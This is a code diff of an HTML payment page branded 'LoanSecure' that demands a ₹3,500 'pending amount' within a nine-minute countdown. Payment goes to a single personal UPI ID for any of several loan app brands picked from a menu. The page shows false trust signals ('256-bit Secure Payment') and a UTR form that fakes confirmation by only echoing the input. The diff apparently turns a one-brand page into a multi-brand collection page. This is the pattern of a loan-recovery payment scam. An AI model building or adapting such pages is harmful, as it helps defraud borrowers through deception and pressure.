@@ -1,98 +1,281 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Secure UPI Payment</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure UPI Payment</title>
 
-  <link rel="stylesheet" href="style.css"/>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Poppins',sans-serif;
+}
+
+body{
+    background:#f5f7fb;
+    padding:30px;
+}
+
+.container{
+    max-width:900px;
+    margin:auto;
+    background:white;
+    border-radius:20px;
+    padding:30px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.1);
+}
+
+.topbar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:30px;
+}
+
+.logo{
+    display:flex;
+    align-items:center;
+    gap:15px;
+}
+
+.shield{
+    width:50px;
+    height:50px;
+    border-radius:50%;
+    background:#4CAF50;
+    color:white;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    font-size:24px;
+}
+
+.secure{
+    color:green;
+    font-weight:600;
+}
+
+.hero{
+    text-align:center;
+    margin-bottom:30px;
+}
+
+.hero h1{
+    margin-bottom:10px;
+}
+
+.product-box{
+    text-align:center;
+    margin-bottom:25px;
+}
+
+select{
+    width:300px;
+    padding:12px;
+    border:1px solid #ccc;
+    border-radius:10px;
+    font-size:16px;
+}
+
+.timer-box{
+    text-align:center;
+    background:#f0f5ff;
+    padding:20px;
+    border-radius:15px;
+    margin-bottom:30px;
+}
+
+#timer{
+    font-size:40px;
+    font-weight:bold;
+    color:#ff4d4f;
+}
+
+.payment-box{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:20px;
+    flex-wrap:wrap;
+}
+
+.left,.right{
+    flex:1;
+    text-align:center;
+}
+
+.qr{
+    width:250px;
+    margin:20px 0;
+}
+
+.upi-box{
+    background:#f5f5f5;
+    padding:12px;
+    border-radius:10px;
+    margin-bottom:15px;
+}
+
+button,.pay-btn{
+    padding:12px 20px;
+    border:none;
+    border-radius:10px;
+    background:#0066ff;
+    color:white;
+    cursor:pointer;
+    text-decoration:none;
+    display:inline-block;
+}
+
+.apps{
+    display:flex;
+    justify-content:center;
+    gap:10px;
+    margin-top:20px;
+}
+
+.apps div{
+    background:#f5f5f5;
+    padding:10px 15px;
+    border-radius:10px;
+}
+
+.utr-section{
+    margin-top:40px;
+    text-align:center;
+}
+
+input{
+    width:350px;
+    padding:12px;
+    border:1px solid #ccc;
+    border-radius:10px;
+    margin-top:15px;
+}
+
+#result{
+    margin-top:20px;
+    padding:15px;
+    border-radius:10px;
+    display:none;
+    background:#eaf7ea;
+}
+
+.processing{
+    margin-top:30px;
+    text-align:center;
+    color:#666;
+}
+
+</style>
+
 </head>
 
 <body>
 
 <div class="container">
 
-  <div class="topbar">
+<div class="topbar">
     <div class="logo">
-      <div class="shield">✔</div>
-      <div>
-        <h2>LoanSecure</h2>
-        <p>Trusted Secure Payments</p>
-      </div>
+        <div class="shield">✔</div>
+        <div>
+            <h2>LoanSecure</h2>
+            <p>Trusted Secure Payments</p>
+        </div>
     </div>
 
     <div class="secure">
-      🔒 256-bit Secure Payment
+        🔒 256-bit Secure Payment
     </div>
-  </div>
+</div>
 
-  <div class="hero">
-    <h1>Tapmoney </h1>
-    <p>Complete your repayment securely within 9 minutes.</p>
-  </div>
+<div class="hero">
+    <h1>Secure Payment Portal</h1>
+    <p>Complete your payment securely within 9 minutes.</p>
 
-  <div class="timer-box">
+    <div style="font-size:22px;font-weight:600;color:#ff4d4f;margin-top:15px;">
+        ₹3,500 Pending Amount
+    </div>
+</div>
+
+<div class="product-box">
+    <h2>Select Product</h2><br>
+
+    <select id="productSelect">
+        <option>Credit Park</option>
+        <option>Happy Wallet</option>
+        <option>Tap Money</option>
+        <option>Karta Loan</option>
+        <option>Prime Loan</option>
+    </select>
+</div>
+
+<div class="timer-box">
     <h3>Session expires in</h3>
-
     <div id="timer">09:00</div>
+</div>
 
-    <div class="status">
-      ● Your payment session is active
-    </div>
-  </div>
-
-  <div class="payment-box">
+<div class="payment-box">
 
     <div class="left">
+        <h2>Scan & Pay</h2>
 
-      <h2>Scan & Pay</h2>
+        <img src="qr1.jpg" class="qr">
 
-      <img src="qr1.jpg" class="qr"/>
+        <div class="upi-box">
+            utkarshhloanrecovery@fam
+        </div>
 
-      <div class="upi-box">
-        utkarshhloanrecovery@fam
-      </div>
-
-      <button onclick="copyUPI()">
-        Copy UPI ID
-      </button>
-
-    </div>
-
-    <div class="divider">
-      OR
+        <button onclick="copyUPI()">Copy UPI ID</button>
     </div>
 
     <div class="right">
+        <h2>Pay Using UPI App</h2>
 
-      <h2>Pay Using UPI App</h2>
+        <a class="pay-btn"
+        href="upi://pay?pa=utkarshhloanrecovery@fam&pn=LoanSecure&cu=INR">
+            Open UPI App
+        </a>
 
-      <a class="pay-btn"
-      href="upi://pay?pa=utkarshhloanrecovery@fam&pn=LoanSecure&cu=INR">
-
-      Open UPI App
-
-      </a>
-
-      <div class="apps">
-
-        <div>GPay</div>
-        <div>PhonePe</div>
-        <div>Paytm</div>
-        <div>BHIM</div>
-
-      </div>
-
+        <div class="apps">
+            <div>GPay</div>
+            <div>PhonePe</div>
+            <div>Paytm</div>
+            <div>BHIM</div>
+        </div>
     </div>
 
-  </div>
+</div>
 
-  <div class="processing">
+<div class="utr-section">
+
+    <h2>Submit UTR Number</h2>
+
+    <input
+        type="text"
+        id="utr"
+        placeholder="Enter UTR / Transaction Reference Number"
+    >
+
+    <br><br>
+
+    <button onclick="submitUTR()">
+        Submit UTR
+    </button>
+
+    <div id="result"></div>
+
+</div>
+
+<div class="processing">
     Awaiting payment confirmation...
-  </div>
+</div>
 
 </div>
 
@@ -102,28 +285,48 @@ let time = 540;
 
 const timer = document.getElementById("timer");
 
-setInterval(() => {
+const countdown = setInterval(() => {
 
-  let minutes = Math.floor(time / 60);
-  let seconds = time % 60;
+    let minutes = Math.floor(time / 60);
+    let seconds = time % 60;
 
-  timer.innerHTML =
+    timer.innerHTML =
     `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
 
-  if(time <= 0){
-    timer.innerHTML = "EXPIRED";
-  }
+    if(time <= 0){
+        timer.innerHTML = "EXPIRED";
+        clearInterval(countdown);
+        return;
+    }
 
-  time--;
+    time--;
 
 },1000);
 
 function copyUPI(){
+    navigator.clipboard.writeText("utkarshhloanrecovery@fam");
+    alert("UPI ID copied successfully.");
+}
 
-  navigator.clipboard.writeText("utkarshhloanrecovery@fam");
+function submitUTR(){
 
-  alert("UPI ID Copied");
+    const utr = document.getElementById("utr").value.trim();
+    const product = document.getElementById("productSelect").value;
 
+    if(utr === ""){
+        alert("Please enter your UTR number.");
+        return;
+    }
+
+    document.getElementById("result").style.display = "block";
+
+    document.getElementById("result").innerHTML =
+    `
+    <h3>Submission Received</h3>
+    <p><b>Product:</b> ${product}</p>
+    <p><b>UTR:</b> ${utr}</p>
+    <p>Your payment reference has been received and is awaiting verification.</p>
+    `;
 }
 
 </script>
